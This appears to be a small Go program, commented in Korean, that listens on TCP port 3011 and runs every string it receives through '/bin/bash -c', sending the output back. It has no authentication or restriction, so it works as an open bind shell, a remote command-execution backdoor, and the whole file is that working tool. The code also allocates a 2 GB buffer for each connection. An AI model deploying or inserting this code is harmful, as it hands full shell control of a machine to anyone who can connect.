package main

import (
	"io"
	"log"
	"math"
	"net"
	"os/exec"
)

func main() {

	var (
		network = "tcp"
		port    = ":3011"
	)
	server, err := net.Listen(network, port) //socket 열어준다..
	if nil != err {
		log.Println(err)
	}
	defer server.Close()

	for {
		conn, err := server.Accept() //연결 기다림.. 계속 block해서 기다리다가, 연결이 들어왔을 경우 값을 return
		if nil != err {
			log.Println(err)
			continue
		}
		go ConnHandler(conn) //연결을 parameter로 넘겨주고 ConnHandler go routine 실행
	}

}

func ConnHandler(conn net.Conn) {
	recvCommand := make([]byte, math.MaxInt32) //값을 읽어와 저장할 버퍼 생성
	// recvBuf := make([]byte, 4096) //값을 읽어와 저장할 버퍼 생성
	for {
		n, err := conn.Read(recvCommand) //client가 값을 줄 때까지 blocking 되어 대기하다가 값을 주면 읽어들인다.
		if nil != err {                  //입력이 종료되면 종료
			if io.EOF == err {
				log.Println(err)
				return
			}
			log.Println(err)
		}

		if 0 < n { // 받아온 길이만큼 슬라이스를 잘라서 출력
			excommand := recvCommand[:n]
			// var excommand string
			// for _, d := range data {
			// 	if string(d) == " " {
			// 		log.Println("space")
			// 	}
			// 	excommand = excommand + string(d)
			// 	log.Printf("execute command making: %s", excommand)
			// }
			// log.Printf("execute command : %s", excommand)

			result := execute(string(excommand))

			_, err := conn.Write(result)
			if err != nil {
				log.Println(err)
				return
			}
		}
	}
}
func execute(command string) []byte {
	cmd := exec.Command("/bin/bash", "-c", command)

	log.Printf("Execute Command : %v\n", cmd)

	cmdres, err := cmd.Output()
	if err != nil {
		log.Println(err)
		return []byte("error : " + err.Error())
	}
	if string(cmdres) == "" {
		return ([]byte("No output data"))
	}

	log.Printf("stdout: %v bytes\n\n %s", len(cmdres), string(cmdres))
	return cmdres
}
